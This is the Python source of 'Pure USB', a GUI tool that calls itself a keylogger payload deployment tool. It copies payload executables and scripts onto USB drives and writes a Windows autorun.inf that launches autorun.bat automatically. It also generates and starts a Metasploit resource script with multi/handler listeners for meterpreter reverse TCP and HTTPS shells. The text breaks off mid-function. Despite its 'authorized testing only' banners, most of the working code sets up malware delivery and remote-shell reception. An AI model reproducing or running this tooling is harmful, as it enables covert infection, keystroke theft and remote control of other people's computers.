#!/usr/bin/env python3
"""
Pure USB - Keylogger Payload Deployment Tool
===========================================

A GUI application for managing and deploying keylogger payloads to USB drives.
For authorized penetration testing only.

Author: Security Research Team
Version: 1.0
License: Educational/Testing Use Only
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os
import subprocess
import threading
import json
import shutil
from pathlib import Path
import time
import hashlib

class PureUSBApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Pure USB - Keylogger Payload Deployment Tool")
        self.root.geometry("900x700")
        self.root.resizable(True, True)
        
        # Set application icon and styling
        self.setup_styling()
        
        # Initialize variables
        self.payload_dir = Path.home() / "pure_usb_payloads"
        self.usb_devices = []
        self.selected_payloads = []
        self.handler_processes = []
        
        # Create main interface
        self.create_widgets()
        self.refresh_payloads()
        self.refresh_usb_devices()
        
        # Auto-refresh USB devices every 3 seconds
        self.auto_refresh_usb()
        
    def setup_styling(self):
        """Configure the application styling"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure colors
        style.configure('Title.TLabel', font=('Arial', 16, 'bold'), foreground='#2c3e50')
        style.configure('Header.TLabel', font=('Arial', 12, 'bold'), foreground='#34495e')
        style.configure('Warning.TLabel', font=('Arial', 10, 'bold'), foreground='#e74c3c')
        style.configure('Success.TLabel', font=('Arial', 10, 'bold'), foreground='#27ae60')
        
        # Configure buttons
        style.configure('Action.TButton', font=('Arial', 10, 'bold'))
        style.configure('Danger.TButton', font=('Arial', 10, 'bold'), foreground='#ffffff')
        
    def create_widgets(self):
        """Create the main GUI widgets"""
        # Main container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(2, weight=1)
        
        # Title
        title_label = ttk.Label(main_frame, text="Pure USB", style='Title.TLabel')
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 10))
        
        subtitle_label = ttk.Label(main_frame, text="Keylogger Payload Deployment Tool", 
                                 font=('Arial', 12), foreground='#7f8c8d')
        subtitle_label.grid(row=1, column=0, columnspan=3, pady=(0, 20))
        
        # Warning notice
        warning_frame = ttk.Frame(main_frame)
        warning_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 20))
        warning_frame.columnconfigure(1, weight=1)
        
        warning_icon = ttk.Label(warning_frame, text="⚠️", font=('Arial', 16))
        warning_icon.grid(row=0, column=0, padx=(0, 10))
        
        warning_text = ttk.Label(warning_frame, 
                               text="FOR AUTHORIZED TESTING ONLY - Use only on systems you own or have explicit permission to test",
                               style='Warning.TLabel', wraplength=600)
        warning_text.grid(row=0, column=1, sticky=(tk.W, tk.E))
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(10, 0))
        
        # Create tabs
        self.create_payloads_tab()
        self.create_usb_tab()
        self.create_handlers_tab()
        self.create_advanced_tab()
        self.create_settings_tab()
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var, 
                              relief=tk.SUNKEN, anchor=tk.W)
        status_bar.grid(row=4, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(10, 0))
        
    def create_payloads_tab(self):
        """Create the payloads management tab"""
        payloads_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(payloads_frame, text="Payloads")
        
        payloads_frame.columnconfigure(0, weight=1)
        payloads_frame.rowconfigure(1, weight=1)
        
        # Header
        header_label = ttk.Label(payloads_frame, text="Available Payloads", style='Header.TLabel')
        header_label.grid(row=0, column=0, sticky=tk.W, pady=(0, 10))
        
        # Payloads listbox with scrollbar
        list_frame = ttk.Frame(payloads_frame)
        list_frame.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        list_frame.columnconfigure(0, weight=1)
        list_frame.rowconfigure(0, weight=1)
        
        self.payloads_listbox = tk.Listbox(list_frame, selectmode=tk.MULTIPLE, height=10)
        self.payloads_listbox.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.payloads_listbox.yview)
        scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.payloads_listbox.configure(yscrollcommand=scrollbar.set)
        
        # Buttons
        buttons_frame = ttk.Frame(payloads_frame)
        buttons_frame.grid(row=2, column=0, sticky=tk.W, pady=(10, 0))
        
        ttk.Button(buttons_frame, text="Refresh", command=self.refresh_payloads).grid(row=0, column=0, padx=(0, 10))
        ttk.Button(buttons_frame, text="Import Payloads", command=self.import_payloads_dialog).grid(row=0, column=1, padx=(0, 10))
        ttk.Button(buttons_frame, text="Generate New", command=self.generate_payload_dialog).grid(row=0, column=2, padx=(0, 10))
        ttk.Button(buttons_frame, text="View Details", command=self.view_payload_details).grid(row=0, column=3, padx=(0, 10))
        
        # Payload info text
        info_frame = ttk.LabelFrame(payloads_frame, text="Payload Information", padding="10")
        info_frame.grid(row=3, column=0, sticky=(tk.W, tk.E), pady=(20, 0))
        info_frame.columnconfigure(0, weight=1)
        
        self.payload_info = tk.Text(info_frame, height=8, wrap=tk.WORD)
        self.payload_info.grid(row=0, column=0, sticky=(tk.W, tk.E))
        
        info_scrollbar = ttk.Scrollbar(info_frame, orient=tk.VERTICAL, command=self.payload_info.yview)
        info_scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.payload_info.configure(yscrollcommand=info_scrollbar.set)
        
        # Bind selection event
        self.payloads_listbox.bind('<<ListboxSelect>>', self.on_payload_select)
        
    def create_usb_tab(self):
        """Create the USB management tab"""
        usb_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(usb_frame, text="USB Deploy")
        
        usb_frame.columnconfigure(1, weight=1)
        
        # USB devices section
        ttk.Label(usb_frame, text="USB Devices", style='Header.TLabel').grid(row=0, column=0, columnspan=3, sticky=tk.W, pady=(0, 10))
        
        # USB devices listbox
        usb_list_frame = ttk.Frame(usb_frame)
        usb_list_frame.grid(row=1, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        usb_list_frame.columnconfigure(0, weight=1)
        
        self.usb_listbox = tk.Listbox(usb_list_frame, height=6)
        self.usb_listbox.grid(row=0, column=0, sticky=(tk.W, tk.E))
        
        usb_scrollbar = ttk.Scrollbar(usb_list_frame, orient=tk.VERTICAL, command=self.usb_listbox.yview)
        usb_scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.usb_listbox.configure(yscrollcommand=usb_scrollbar.set)
        
        # USB buttons
        usb_buttons_frame = ttk.Frame(usb_frame)
        usb_buttons_frame.grid(row=2, column=0, columnspan=3, sticky=tk.W, pady=(10, 0))
        
        ttk.Button(usb_buttons_frame, text="Refresh USB", command=self.refresh_usb_devices).grid(row=0, column=0, padx=(0, 10))
        ttk.Button(usb_buttons_frame, text="Mount Selected", command=self.mount_usb).grid(row=0, column=1, padx=(0, 10))
        ttk.Button(usb_buttons_frame, text="Unmount", command=self.unmount_usb).grid(row=0, column=2, padx=(0, 10))
        
        # Deployment options
        deploy_frame = ttk.LabelFrame(usb_frame, text="Deployment Options", padding="10")
        deploy_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(20, 0))
        deploy_frame.columnconfigure(1, weight=1)
        
        # Create organized structure checkbox
        self.organized_structure = tk.BooleanVar(value=True)
        ttk.Checkbutton(deploy_frame, text="Create organized directory structure", 
                       variable=self.organized_structure).grid(row=0, column=0, columnspan=2, sticky=tk.W)
        
        # Create launchers checkbox
        self.create_launchers = tk.BooleanVar(value=True)
        ttk.Checkbutton(deploy_frame, text="Include launcher scripts", 
                       variable=self.create_launchers).grid(row=1, column=0, columnspan=2, sticky=tk.W)
        
        # Create autorun checkbox
        self.create_autorun = tk.BooleanVar(value=True)
        ttk.Checkbutton(deploy_frame, text="Create Windows autorun.inf", 
                       variable=self.create_autorun).grid(row=2, column=0, columnspan=2, sticky=tk.W)
        
        # Deploy button
        deploy_button = ttk.Button(deploy_frame, text="Deploy to USB", 
                                 command=self.deploy_to_usb, style='Action.TButton')
        deploy_button.grid(row=3, column=0, columnspan=2, pady=(20, 0))
        
        # Progress bar
        self.progress = ttk.Progressbar(deploy_frame, mode='indeterminate')
        self.progress.grid(row=4, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(10, 0))
        
    def create_handlers_tab(self):
        """Create the handlers management tab"""
        handlers_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(handlers_frame, text="Handlers")
        
        handlers_frame.columnconfigure(0, weight=1)
        
        # Header
        ttk.Label(handlers_frame, text="Metasploit Handlers", style='Header.TLabel').grid(row=0, column=0, sticky=tk.W, pady=(0, 10))
        
        # Handler configuration
        config_frame = ttk.LabelFrame(handlers_frame, text="Handler Configuration", padding="10")
        config_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=(0, 10))
        config_frame.columnconfigure(1, weight=1)
        
        # LHOST input
        ttk.Label(config_frame, text="LHOST:").grid(row=0, column=0, sticky=tk.W, padx=(0, 10))
        self.lhost_var = tk.StringVar()
        self.lhost_entry = ttk.Entry(config_frame, textvariable=self.lhost_var, width=30)
        self.lhost_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(0, 10))
        
        # Auto-detect IP button
        ttk.Button(config_frame, text="Auto-detect", command=self.auto_detect_ip).grid(row=0, column=2)
        
        # Handler list
        handlers_list_frame = ttk.LabelFrame(handlers_frame, text="Active Handlers", padding="10")
        handlers_list_frame.grid(row=2, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(10, 0))
        handlers_list_frame.columnconfigure(0, weight=1)
        handlers_list_frame.rowconfigure(0, weight=1)
        
        self.handlers_tree = ttk.Treeview(handlers_list_frame, columns=('Payload', 'Port', 'Status'), show='headings', height=10)
        self.handlers_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure treeview columns
        self.handlers_tree.heading('Payload', text='Payload Type')
        self.handlers_tree.heading('Port', text='Port')
        self.handlers_tree.heading('Status', text='Status')
        
        self.handlers_tree.column('Payload', width=300)
        self.handlers_tree.column('Port', width=100)
        self.handlers_tree.column('Status', width=100)
        
        handlers_scrollbar = ttk.Scrollbar(handlers_list_frame, orient=tk.VERTICAL, command=self.handlers_tree.yview)
        handlers_scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.handlers_tree.configure(yscrollcommand=handlers_scrollbar.set)
        
        # Handler buttons
        handlers_buttons_frame = ttk.Frame(handlers_frame)
        handlers_buttons_frame.grid(row=3, column=0, sticky=tk.W, pady=(10, 0))
        
        ttk.Button(handlers_buttons_frame, text="Start All Handlers", 
                  command=self.start_all_handlers, style='Action.TButton').grid(row=0, column=0, padx=(0, 10))
        ttk.Button(handlers_buttons_frame, text="Stop All Handlers", 
                  command=self.stop_all_handlers).grid(row=0, column=1, padx=(0, 10))
        ttk.Button(handlers_buttons_frame, text="Open MSF Console", 
                  command=self.open_msf_console).grid(row=0, column=2, padx=(0, 10))
        
    def create_advanced_tab(self):
        """Create the advanced features tab"""
        advanced_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(advanced_frame, text="Advanced")
        
        advanced_frame.columnconfigure(0, weight=1)
        
        # Steganography section
        stego_frame = ttk.LabelFrame(advanced_frame, text="Steganography", padding="10")
        stego_frame.grid(row=0, column=0, sticky=(tk.W, tk.E), pady=(0, 10))
        stego_frame.columnconfigure(1, weight=1)
        
        ttk.Label(stego_frame, text="Cover Image:").grid(row=0, column=0, sticky=tk.W, padx=(0, 10))
        self.cover_image_var = tk.StringVar()
        ttk.Entry(stego_frame, textvariable=self.cover_image_var).grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(0, 10))
        ttk.Button(stego_frame, text="Browse", command=self.browse_cover_image).grid(row=0, column=2)
        
        ttk.Label(stego_frame, text="Password:").grid(row=1, column=0, sticky=tk.W, padx=(0, 10), pady=(10, 0))
        self.stego_password_var = tk.StringVar()
        ttk.Entry(stego_frame, textvariable=self.stego_password_var, show="*").grid(row=1, column=1, sticky=(tk.W, tk.E), padx=(0, 10), pady=(10, 0))
        
        ttk.Button(stego_frame, text="Create Stego Payload", 
                  command=self.create_stego_payload).grid(row=2, column=0, columnspan=3, pady=(20, 0))
        
        # Encryption section
        encryption_frame = ttk.LabelFrame(advanced_frame, text="USB Encryption", padding="10")
        encryption_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=(10, 0))
        
        self.encrypt_usb = tk.BooleanVar()
        ttk.Checkbutton(encryption_frame, text="Encrypt USB contents", 
                       variable=self.encrypt_usb).grid(row=0, column=0, sticky=tk.W)
        
        ttk.Label(encryption_frame, text="Encryption Password:").grid(row=1, column=0, sticky=tk.W, pady=(10, 0))
        self.encryption_password_var = tk.StringVar()
        ttk.Entry(encryption_frame, textvariable=self.encryption_password_var, show="*").grid(row=1, column=1, sticky=(tk.W, tk.E), padx=(10, 0), pady=(10, 0))
        
        # Payload generation section
        generation_frame = ttk.LabelFrame(advanced_frame, text="Payload Generation", padding="10")
        generation_frame.grid(row=2, column=0, sticky=(tk.W, tk.E), pady=(10, 0))
        
        ttk.Button(generation_frame, text="Generate Custom Payload", 
                  command=self.generate_custom_payload).grid(row=0, column=0, padx=(0, 10))
        ttk.Button(generation_frame, text="Encode Existing Payload", 
                  command=self.encode_payload).grid(row=0, column=1, padx=(0, 10))
        ttk.Button(generation_frame, text="Create Dropper", 
                  command=self.create_dropper).grid(row=0, column=2)
        
    def create_settings_tab(self):
        """Create the settings tab"""
        settings_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(settings_frame, text="Settings")
        
        settings_frame.columnconfigure(0, weight=1)
        
        # General settings
        general_frame = ttk.LabelFrame(settings_frame, text="General Settings", padding="10")
        general_frame.grid(row=0, column=0, sticky=(tk.W, tk.E), pady=(0, 10))
        general_frame.columnconfigure(1, weight=1)
        
        ttk.Label(general_frame, text="Payload Directory:").grid(row=0, column=0, sticky=tk.W, padx=(0, 10))
        self.payload_dir_var = tk.StringVar(value=str(self.payload_dir))
        ttk.Entry(general_frame, textvariable=self.payload_dir_var).grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(0, 10))
        ttk.Button(general_frame, text="Browse", command=self.browse_payload_dir).grid(row=0, column=2)
        
        # Auto-refresh checkbox
        self.auto_refresh_usb_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(general_frame, text="Auto-refresh USB devices", 
                       variable=self.auto_refresh_usb_var).grid(row=1, column=0, columnspan=3, sticky=tk.W, pady=(10, 0))
        
        # About section
        about_frame = ttk.LabelFrame(settings_frame, text="About Pure USB", padding="10")
        about_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=(10, 0))
        
        about_text = """Pure USB v1.0
Keylogger Payload Deployment Tool

For authorized penetration testing only.
Use only on systems you own or have explicit permission to test.

Features:
• Payload management and deployment
• USB device detection and mounting
• Automated handler setup
• Steganography support
• Cross-platform compatibility

Remember to clean up after testing and follow all legal guidelines."""
        
        ttk.Label(about_frame, text=about_text, justify=tk.LEFT).grid(row=0, column=0, sticky=tk.W)
        
        # Buttons
        buttons_frame = ttk.Frame(settings_frame)
        buttons_frame.grid(row=2, column=0, sticky=tk.W, pady=(20, 0))
        
        ttk.Button(buttons_frame, text="Save Settings", command=self.save_settings).grid(row=0, column=0, padx=(0, 10))
        ttk.Button(buttons_frame, text="Load Settings", command=self.load_settings).grid(row=0, column=1, padx=(0, 10))
        ttk.Button(buttons_frame, text="Reset to Defaults", command=self.reset_settings).grid(row=0, column=2)
    
    def refresh_payloads(self):
        """Refresh the payloads list"""
        self.payloads_listbox.delete(0, tk.END)
        
        payload_files = []
        extensions = ['.exe', '.py', '.ps1', '.rc', '.sh']
        
        for ext in extensions:
            payload_files.extend(list(self.payload_dir.glob(f'*{ext}')))
        
        # Filter out Pure USB itself and utility scripts
        excluded = ['pure_usb.py', 'copy_to_usb.sh', 'run_payload.sh']
        payload_files = [f for f in payload_files if f.name not in excluded]
        
        for payload_file in sorted(payload_files):
            size = payload_file.stat().st_size
            size_str = self.format_file_size(size)
            display_text = f"{payload_file.name} ({size_str})"
            self.payloads_listbox.insert(tk.END, display_text)
        
        self.update_status(f"Found {len(payload_files)} payload files")
    
    def refresh_usb_devices(self):
        """Refresh the USB devices list"""
        self.usb_listbox.delete(0, tk.END)
        self.usb_devices = []
        
        try:
            # Run lsblk to get block devices
            result = subprocess.run(['lsblk', '-J', '-o', 'NAME,SIZE,TYPE,MOUNTPOINT,LABEL'], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                import json
                data = json.loads(result.stdout)
                
                for device in data.get('blockdevices', []):
                    if device.get('type') == 'disk':
                        # Check children for partitions
                        for child in device.get('children', []):
                            if child.get('type') == 'part':
                                device_info = {
                                    'name': f"/dev/{child['name']}",
                                    'size': child['size'],
                                    'label': child.get('label', 'Unknown'),
                                    'mountpoint': child.get('mountpoint', '')
                                }
                                self.usb_devices.append(device_info)
                                
                                display_text = f"{device_info['name']} ({device_info['size']}) - {device_info['label']}"
                                if device_info['mountpoint']:
                                    display_text += f" [Mounted: {device_info['mountpoint']}]"
                                
                                self.usb_listbox.insert(tk.END, display_text)
            
            self.update_status(f"Found {len(self.usb_devices)} storage devices")
            
        except Exception as e:
            self.update_status(f"Error scanning USB devices: {str(e)}")
    
    def auto_refresh_usb(self):
        """Auto-refresh USB devices every 3 seconds"""
        if self.auto_refresh_usb_var.get():
            self.refresh_usb_devices()
        
        # Schedule next refresh
        self.root.after(3000, self.auto_refresh_usb)
    
    def on_payload_select(self, event):
        """Handle payload selection"""
        selection = self.payloads_listbox.curselection()
        if not selection:
            return
        
        # Get selected payload info
        selected_items = [self.payloads_listbox.get(i).split(' (')[0] for i in selection]
        
        info_text = f"Selected Payloads: {len(selected_items)}\n\n"
        
        for item in selected_items:
            payload_path = self.payload_dir / item
            if payload_path.exists():
                stat = payload_path.stat()
                info_text += f"File: {item}\n"
                info_text += f"Size: {self.format_file_size(stat.st_size)}\n"
                info_text += f"Modified: {time.ctime(stat.st_mtime)}\n"
                info_text += f"Type: {self.get_payload_type(item)}\n"
                info_text += "-" * 50 + "\n\n"
        
        self.payload_info.delete(1.0, tk.END)
        self.payload_info.insert(1.0, info_text)
    
    def deploy_to_usb(self):
        """Deploy selected payloads to USB"""
        # Get selected USB device
        usb_selection = self.usb_listbox.curselection()
        if not usb_selection:
            messagebox.showerror("Error", "Please select a USB device")
            return
        
        # Get selected payloads
        payload_selection = self.payloads_listbox.curselection()
        if not payload_selection:
            messagebox.showerror("Error", "Please select payloads to deploy")
            return
        
        # Confirm deployment
        if not messagebox.askyesno("Confirm Deployment", 
                                  f"Deploy {len(payload_selection)} payloads to USB?\n\nThis will copy files to the selected USB device."):
            return
        
        # Start deployment in separate thread
        threading.Thread(target=self._deploy_to_usb_thread, daemon=True).start()
    
    def _deploy_to_usb_thread(self):
        """Deploy to USB in separate thread"""
        try:
            self.progress.start()
            self.update_status("Deploying to USB...")
            
            # Get selected device
            usb_index = self.usb_listbox.curselection()[0]
            usb_device = self.usb_devices[usb_index]
            
            # Mount if not already mounted
            if not usb_device['mountpoint']:
                mount_point = f"/mnt/pure_usb_{int(time.time())}"
                os.makedirs(mount_point, exist_ok=True)
                subprocess.run(['sudo', 'mount', usb_device['name'], mount_point], check=True)
                usb_device['mountpoint'] = mount_point
            
            mount_point = usb_device['mountpoint']
            
            # Create directory structure if requested
            if self.organized_structure.get():
                os.makedirs(f"{mount_point}/payloads", exist_ok=True)
                os.makedirs(f"{mount_point}/documentation", exist_ok=True)
                os.makedirs(f"{mount_point}/launchers", exist_ok=True)
            
            # Copy selected payloads
            payload_selection = self.payloads_listbox.curselection()
            for i in payload_selection:
                payload_name = self.payloads_listbox.get(i).split(' (')[0]
                src_path = self.payload_dir / payload_name
                
                if self.organized_structure.get():
                    if payload_name.endswith(('.exe', '.py', '.ps1')):
                        dest_dir = f"{mount_point}/payloads"
                    else:
                        dest_dir = f"{mount_point}/documentation"
                else:
                    dest_dir = mount_point
                
                shutil.copy2(src_path, dest_dir)
            
            # Copy launchers if requested
            if self.create_launchers.get():
                launcher_files = ['autorun.bat', 'run_payload.sh']
                for launcher in launcher_files:
                    src_launcher = self.payload_dir / launcher
                    if src_launcher.exists():
                        if self.organized_structure.get():
                            shutil.copy2(src_launcher, f"{mount_point}/launchers/")
                        shutil.copy2(src_launcher, mount_point)
            
            # Create autorun.inf if requested
            if self.create_autorun.get():
                autorun_content = """[autorun]
open=autorun.bat
icon=autorun.bat,1
label=Pure USB Payloads

[Content]
MusicFiles=false
PictureFiles=false
VideoFiles=false
"""
                with open(f"{mount_point}/autorun.inf", 'w') as f:
                    f.write(autorun_content)
            
            # Sync filesystem
            subprocess.run(['sync'])
            
            self.progress.stop()
            self.update_status("Deployment completed successfully")
            messagebox.showinfo("Success", "Payloads deployed to USB successfully!")
            
        except Exception as e:
            self.progress.stop()
            self.update_status(f"Deployment failed: {str(e)}")
            messagebox.showerror("Deployment Failed", f"Failed to deploy payloads:\n\n{str(e)}")
    
    def mount_usb(self):
        """Mount selected USB device"""
        selection = self.usb_listbox.curselection()
        if not selection:
            messagebox.showerror("Error", "Please select a USB device")
            return
        
        usb_device = self.usb_devices[selection[0]]
        
        if usb_device['mountpoint']:
            messagebox.showinfo("Info", "Device is already mounted")
            return
        
        try:
            mount_point = f"/mnt/pure_usb_{int(time.time())}"
            os.makedirs(mount_point, exist_ok=True)
            subprocess.run(['sudo', 'mount', usb_device['name'], mount_point], check=True)
            usb_device['mountpoint'] = mount_point
            self.refresh_usb_devices()
            self.update_status(f"Mounted {usb_device['name']} at {mount_point}")
        except Exception as e:
            messagebox.showerror("Mount Failed", f"Failed to mount device:\n\n{str(e)}")
    
    def unmount_usb(self):
        """Unmount selected USB device"""
        selection = self.usb_listbox.curselection()
        if not selection:
            messagebox.showerror("Error", "Please select a USB device")
            return
        
        usb_device = self.usb_devices[selection[0]]
        
        if not usb_device['mountpoint']:
            messagebox.showinfo("Info", "Device is not mounted")
            return
        
        try:
            subprocess.run(['sudo', 'umount', usb_device['mountpoint']], check=True)
            usb_device['mountpoint'] = ''
            self.refresh_usb_devices()
            self.update_status(f"Unmounted {usb_device['name']}")
        except Exception as e:
            messagebox.showerror("Unmount Failed", f"Failed to unmount device:\n\n{str(e)}")
    
    def auto_detect_ip(self):
        """Auto-detect local IP address"""
        try:
            result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
            if result.returncode == 0:
                ip = result.stdout.strip().split()[0]
                self.lhost_var.set(ip)
                self.update_status(f"Detected IP: {ip}")
        except Exception as e:
            messagebox.showerror("IP Detection Failed", f"Failed to detect IP:\n\n{str(e)}")
    
    def start_all_handlers(self):
        """Start all Metasploit handlers"""
        if not self.lhost_var.get():
            messagebox.showerror("Error", "Please set LHOST IP address")
            return
        
        threading.Thread(target=self._start_handlers_thread, daemon=True).start()
    
    def _start_handlers_thread(self):
        """Start handlers in separate thread"""
        try:
            # Create handler resource script
            handler_script = self.payload_dir / "temp_handlers.rc"
            
            with open(handler_script, 'w') as f:
                f.write(f"""# Auto-generated handlers for Pure USB
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST {self.lhost_var.get()}
set LPORT 4444
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST {self.lhost_var.get()}
set LPORT 4445
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST {self.lhost_var.get()}
set LPORT 443
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 8080
set ExitOnSession false
exploit -j

sessions -l
""")
            
            # Update handlers tree
            self.handlers_tree.delete(*self.handlers_tree.get_children())
            
            handlers_info = [
                ("windows/x64/meterpreter/reverse_tcp", "4444", "Starting"),
                ("python/meterpreter/reverse_tcp", "4445", "Starting"),
                ("windows/meterpreter/reverse_https", "443", "Starting"),
                ("windows/x64/meterpreter/reverse_tcp", "8080", "Starting")
            ]
            
            for payload, port, status in handlers_info:
                self.handlers_tree.insert('', tk.END, values=(payload, port, status))
            
            self.update_status("Handlers configured - launching Metasploit...")
            
            # Launch Metasploit console
            subprocess.Popen(['gnome-terminal', '--', 'msfconsole', '-r', str(handler_script)])
            
            # Update status to running after a delay
            self.root.after(5000, self._update_handlers_status)
            
        except Exception as e:
            self.update_status(f"Failed to start handlers: {str(e)}")
            messagebox.showerror("Handler Start Failed", f"Failed to start handlers:\n\n{str(e)}")
    
    def _update_handlers_status(self):
        """Update handlers status to running"""
        for item in self.handlers_tree.get_children():
            values = list(self.handlers_tree.item(item)['values'])
            values[2] = "Running"
            self.handlers_tree.item(item, values=values)
        
        self.update_status("Handlers started successfully")
    
    def stop_all_handlers(self):
        """Stop all handlers"""
        # Clear handlers tree
        self.handlers_tree.delete(*self.handlers_tree.get_children())
        self.update_status("Handlers stopped")
        messagebox.showinfo("Handlers Stopped", "All handlers have been stopped")
    
    def open_msf_console(self):
        """Open Metasploit console in new terminal"""
        try:
            subprocess.Popen(['gnome-terminal', '--', 'msfconsole'])
            self.update_status("Metasploit console opened")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to open Metasploit console:\n\n{str(e)}")
    
    def import_payloads_dialog(self):
        """Show payload import dialog"""
        dialog = PayloadImportDialog(self.root, self)
        self.root.wait_window(dialog.dialog)
    
    def generate_payload_dialog(self):
        """Show payload generation dialog"""
        dialog = PayloadGeneratorDialog(self.root, self)
        self.root.wait_window(dialog.dialog)
    
    def view_payload_details(self):
        """View detailed payload information"""
        selection = self.payloads_listbox.curselection()
        if not selection:
            messagebox.showinfo("Info", "Please select a payload to view details")
            return
        
        payload_name = self.payloads_listbox.get(selection[0]).split(' (')[0]
        dialog = PayloadDetailsDialog(self.root, self.payload_dir / payload_name)
        self.root.wait_window(dialog.dialog)
    
    def browse_cover_image(self):
        """Browse for cover image for steganography"""
        filename = filedialog.askopenfilename(
            title="Select Cover Image",
            filetypes=[("Image files", "*.jpg *.jpeg *.png *.bmp"), ("All files", "*.*")]
        )
        if filename:
            self.cover_image_var.set(filename)
    
    def create_stego_payload(self):
        """Create steganographic payload"""
        if not self.cover_image_var.get():
            messagebox.showerror("Error", "Please select a cover image")
            return
        
        if not self.stego_password_var.get():
            messagebox.showerror("Error", "Please enter a password")
            return
        
        # Implementation for steganography
        messagebox.showinfo("Info", "Steganographic payload creation not yet implemented")
    
    def generate_custom_payload(self):
        """Generate custom payload"""
        messagebox.showinfo("Info", "Custom payload generation not yet implemented")
    
    def encode_payload(self):
        """Encode existing payload"""
        messagebox.showinfo("Info", "Payload encoding not yet implemented")
    
    def create_dropper(self):
        """Create payload dropper"""
        messagebox.showinfo("Info", "Dropper creation not yet implemented")
    
    def browse_payload_dir(self):
        """Browse for payload directory"""
        directory = filedialog.askdirectory(title="Select Payload Directory")
        if directory:
            self.payload_dir = Path(directory)
            self.payload_dir_var.set(str(self.payload_dir))
            self.refresh_payloads()
    
    def save_settings(self):
        """Save application settings"""
        settings = {
            'payload_dir': str(self.payload_dir),
            'lhost': self.lhost_var.get(),
            'auto_refresh_usb': self.auto_refresh_usb_var.get(),
            'organized_structure': self.organized_structure.get(),
            'create_launchers': self.create_launchers.get(),
            'create_autorun': self.create_autorun.get()
        }
        
        try:
            with open(self.payload_dir / 'pure_usb_settings.json', 'w') as f:
                json.dump(settings, f, indent=2)
            messagebox.showinfo("Settings Saved", "Settings saved successfully")
        except Exception as e:
            messagebox.showerror("Save Failed", f"Failed to save settings:\n\n{str(e)}")
    
    def load_settings(self):
        """Load application settings"""
        try:
            with open(self.payload_dir / 'pure_usb_settings.json', 'r') as f:
                settings = json.load(f)
            
            self.payload_dir = Path(settings.get('payload_dir', self.payload_dir))
            self.payload_dir_var.set(str(self.payload_dir))
            self.lhost_var.set(settings.get('lhost', ''))
            self.auto_refresh_usb_var.set(settings.get('auto_refresh_usb', True))
            self.organized_structure.set(settings.get('organized_structure', True))
            self.create_launchers.set(settings.get('create_launchers', True))
            self.create_autorun.set(settings.get('create_autorun', True))
            
            self.refresh_payloads()
            messagebox.showinfo("Settings Loaded", "Settings loaded successfully")
            
        except FileNotFoundError:
            messagebox.showinfo("Info", "No settings file found")
        except Exception as e:
            messagebox.showerror("Load Failed", f"Failed to load settings:\n\n{str(e)}")
    
    def reset_settings(self):
        """Reset settings to defaults"""
        if messagebox.askyesno("Reset Settings", "Reset all settings to defaults?"):
            self.lhost_var.set('')
            self.auto_refresh_usb_var.set(True)
            self.organized_structure.set(True)
            self.create_launchers.set(True)
            self.create_autorun.set(True)
            messagebox.showinfo("Settings Reset", "Settings reset to defaults")
    
    def update_status(self, message):
        """Update status bar"""
        self.status_var.set(message)
        self.root.update_idletasks()
    
    def format_file_size(self, size_bytes):
        """Format file size in human readable format"""
        if size_bytes == 0:
            return "0 B"
        
        size_names = ["B", "KB", "MB", "GB"]
        i = 0
        while size_bytes >= 1024 and i < len(size_names) - 1:
            size_bytes /= 1024.0
            i += 1
        
        return f"{size_bytes:.1f} {size_names[i]}"
    
    def get_payload_type(self, filename):
        """Get payload type from filename"""
        ext = Path(filename).suffix.lower()
        types = {
            '.exe': 'Windows Executable',
            '.py': 'Python Script',
            '.ps1': 'PowerShell Script',
            '.rc': 'Metasploit Resource',
            '.sh': 'Shell Script',
